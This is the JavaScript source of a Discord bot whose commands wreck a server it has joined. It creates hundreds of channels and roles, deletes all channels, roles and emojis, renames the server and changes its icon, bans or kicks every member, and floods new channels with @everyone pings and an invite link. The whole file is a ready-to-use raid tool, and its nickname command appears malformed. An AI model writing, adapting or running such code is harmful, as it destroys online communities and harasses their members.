const Discord = require('discord.js')
const { Client, Intents, webhookClient } = require('discord.js')

const config = require('./config.json')
const token = config.token
const prefix = config.prefix

const client = new Discord.Client({
	intents: new Discord.Intents(32767)
})



client.on('ready', () => {
	console.log(`Login ${client.user.tag}`)
});

client.on('message', message => {
	if (!message.content.startsWith(prefix) || message.author.bot) return;
	
	const args = message.content.slice(prefix.length).trim().split(' ');
	const command = args.shift().toLowerCase();

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "cc") {
	
const channelname = args.join(' ')
	if(!channelname) {
		for(let i = 0; i <= 500; i++){
			message.guild.channels.create("Reflex ʚĭɞ", {
        type: "text",
        permissionOverwrites: [
           {
             id: message.guild.roles.everyone,
             allow: ['VIEW_CHANNEL'],
             deny: ['SEND_MESSAGES']
           }
        ]
      })
    }
  }

		for(let i = 0; i <= 500; i++){
			message.guild.channels.create(channelname, {
        type: "text",
        permissionOverwrites: [
           {
             id: message.guild.roles.everyone,
             allow: ['VIEW_CHANNEL'],
             deny: ['SEND_MESSAGES']
           }
        ]
      })
    }
  }

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "cr") {
const rolename = args.join(' ')
	if(!rolename) {
		for(let i = 0; i <= 500; i++) {
           message.guild.roles.create({
            data: {
              name: "Reflex ʚĭɞ",
              color: 'RANDOM',
              permissions: [3]
            }
          })
        }
      }
		
		
       for(let i = 0; i <= 500; i++) {
           message.guild.roles.create({
            data: {
              name: rolename,
              color: 'RANDOM',
              permissions: [3]
            }
          })
        }
      }

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "dc") {
	message.guild.channels.cache.forEach(ch => {
        ch.delete()
    })
  }

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "dr") {
	message.guild.roles.cache.forEach(ro => {
        ro.delete()
    })
  }

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "de") {
	message.guild.emojis.cache.forEach(eo => {
        eo.delete()
    })
  }

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "gn") {
const guildname = args.join(' ')
	if(!guildname) {
	message.guild.setName("Reflex ʚĭɞ")
}

         message.guild.setName(guildname)
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "gi") {
const guildname = args.join(' ')
	if(!guildname) {
	message.guild.setIcon("https://media.discordapp.net/attachments/958364790693171231/958368168563310642/3b7646edcff11766cbf16808f1200d51.jpg")
}

         message.guild.setIcon(guildname)
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "ban") {
	
	message.guild.members.fetch().then((members) => members.forEach((member) => {
		member.ban({ reason: "Reflex ʚĭɞ" }).catch(error => {
    	console.log(error)
        })
	})
  )
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "kick") {
	
	message.guild.members.fetch().then((members) => members.forEach((member) => {
		member.kick({ reason: "Reflex ʚĭɞ" }).catch(error => {
    	console.log(error)
        })
	})
  )
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "sn") {
	
	message.guild.members.fetch().then((members) => members.forEach((member) => {
		member.setNickname({ reason: "Reflex ʚĭɞ" }).catch(error => {
    	console.log(error)
        })
	})
  )
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "rf") {
	
const channelname = args.join(' ')
	if(!channelname) {
		for(let i = 0; i <= 500; i++){
			message.guild.channels.create("R5flex ʚĭɞ", {
        type: "text",
        permissionOverwrites: [
           {
             id: message.guild.roles.everyone,
             allow: ['VIEW_CHANNEL'],
             deny: ['SEND_MESSAGES']
           }
        ]
      }).then(
        function (ch, i) {
	        	for(let i = 0; i <= 500; i++) {
        	ch.send("[ **@everyone** ] » __ https://discord.gg/w3dETjj6aS __")
           }
         }
       )
     }
  }
      for(let i = 0; i <= 500; i++){
			message.guild.channels.create(channelname, {
        type: "text",
        permissionOverwrites: [
           {
             id: message.guild.roles.everyone,
             allow: ['VIEW_CHANNEL'],
             deny: ['SEND_MESSAGES']
           }
        ]
      }).then(
        function (ch, i) {
	        	for(let i = 0; i <= 500; i++) {
        	ch.send("[ **@everyone** ] » __ https://discord.gg/w3dETjj6aS __")
           }
         }
       )
     }
   }
   
/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
  
if(command === "help") {

		const eiei = new Discord.MessageEmbed()
		
.setAuthor(" COMMAND LIST ", client.user.displayAvatarURL())
.addField(" CREATECHANNEL ", `\`\`\`ini\n[ ${prefix}cc <channelname> ]\`\`\``, true)
.addField(" CREATEROLE ", `\`\`\`ini\n[ ${prefix}cr <rolename> ]\`\`\``, true)
.addField(" DELETECHANNEL ", `\`\`\`ini\n[ ${prefix}dc ]\`\`\``, true)
.addField(" DELETEROLE ", `\`\`\`ini\n[ ${prefix}dr ]\`\`\``, true)
.addField(" DELETEEMOJI ", `\`\`\`ini\n[ ${prefix}de ]\`\`\``, true)
.addField(" SETGUILDNAME ", `\`\`\`ini\n[ ${prefix}gn <guildname> ]\`\`\``, true)
.addField(" SETGUILDICON ", `\`\`\`ini\n[ ${prefix}gi <url link> ]\`\`\``, true)
.addField(" SPAMNICKNAME ", `\`\`\`ini\n[ ${prefix}sn <nickname> ]\`\`\``, true)
.addField(" BANALL ", `\`\`\`ini\n[ ${prefix}ban ]\`\`\``, true)
.addField(" KICKALL ", `\`\`\`ini\n[ ${prefix}kick ]\`\`\``, true)
.addField(" PINGSPAM ", `\`\`\`ini\n[ ${prefix}rf <channelname> ]\`\`\``, true)
.setColor(`#020400`)
	message.channel.send({ embeds: [eiei] })
}

/////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////

if(command === "stop") {
	message.channel.send("Shutting down...").then(() => {
            client.destroy();
        })
  }
})

client.login(token)
